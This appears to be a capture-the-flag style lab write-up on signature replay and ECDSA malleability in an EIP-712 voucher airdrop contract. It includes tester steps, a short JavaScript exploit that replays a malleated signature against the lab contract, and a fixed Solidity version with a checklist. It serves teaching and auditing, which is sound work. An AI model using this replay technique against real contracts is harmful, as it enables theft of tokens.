# 06 — One Voucher, Many Claims (Signature replay + malleability)

**Layer:** Signature & auth · **Difficulty:** Hard · **SWC-121, SWC-117** · **OWASP SC Top 10 (2025): SC01; OWASP API2:2023**

## Root cause
The issuer signs an EIP-712 `Voucher(address to, uint256 amount)`. Several things are missing or wrong:

| Problem | Effect |
|---|---|
| No **nonce** in the message | the message itself never becomes "used" |
| No **deadline** | a voucher is valid forever |
| Domain has no **chainId** or **verifyingContract** | the same signature is valid on any chain and for any copy of this contract with the same name and version (cross-chain / cross-contract replay) |
| "Replay protection" keyed on **`keccak256(r, s, v)`** (the signature bytes) | a *different* valid signature for the same message is not seen as used |
| Raw **`ecrecover`** | accepts both the low-s and high-s forms of a signature (malleability) |

For any ECDSA signature `(r, s, v)` over secp256k1, `(r, n - s, v ^ 1)` is also valid for the same message and key. The contract stores the first signature's hash. The malleated one has a different hash, so it passes.

## How a tester finds it
1. **Decode exactly what is signed.** In the UI, request the voucher and read the `domain` and fields. In DevTools, look at any `eth_signTypedData_v4` payload.
2. **Ask "what makes this single-use?"** Look for a nonce (or a used-message-hash map), a deadline, and a chainId/verifyingContract in the domain.
3. **Check how "used" is recorded.** Keying on the signature instead of the message hash or nonce is a red flag.
4. **Check the verifier.** Raw `ecrecover` without a low-s check and without a `!= address(0)` check is suspect. OpenZeppelin `ECDSA.recover` handles both.
5. **Replay:** submit the same signature twice, then the malleated form, then on another chain id.

## Exploit
`test/06-signature-replay.test.js`:
```js
const v = await (await fetch("/api/challenges/06-signature-replay/bot/requestVoucher", { method: "POST" })).json();
const a = await dvd.contract("VoucherAirdropVulnerable", dvd.state("06-signature-replay").airdrop);
await (await a.claim(v.to, v.amount, v.v, v.r, v.s)).wait();                      // legit
const n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
const s2 = ethers.toBeHex(n - BigInt(v.s), 32), v2 = v.v === 27 ? 28 : 27;
await (await a.claim(v.to, v.amount, v2, v.r, s2)).wait();                        // malleated replay
```

## The fix
```solidity
contract VoucherAirdropSecure is EIP712 {                         // domain = name, version, chainId, this
    bytes32 constant VOUCHER_TYPEHASH =
        keccak256("Voucher(address to,uint256 amount,uint256 nonce,uint256 deadline)");
    mapping(address => uint256) public nonces;
    function claim(address to, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(block.timestamp <= deadline, "voucher expired");
        bytes32 structHash = keccak256(abi.encode(VOUCHER_TYPEHASH, to, amount, nonces[to], deadline));
        address signer = ECDSA.recover(_hashTypedDataV4(structHash), v, r, s); // rejects high-s
        require(signer == issuer, "bad signature");
        nonces[to]++;
        token.transfer(to, amount);
    }
}
```

## Why it works
After the first claim, the nonce moves on, so the *message* no longer verifies, whatever signature encoding is used. The malleated signature is rejected by `ECDSA.recover` with `ECDSAInvalidSignatureS`. A signature made for chain id 1 is rejected because the domain separator includes `block.chainid` (also tested).

## Checklist for any signed message (on-chain or backend)
nonce · deadline · chainId · verifying contract/audience · single-use enforced on the **message**, not the signature · library verifier · the signed fields cover everything the action depends on (recipient, amount, token).
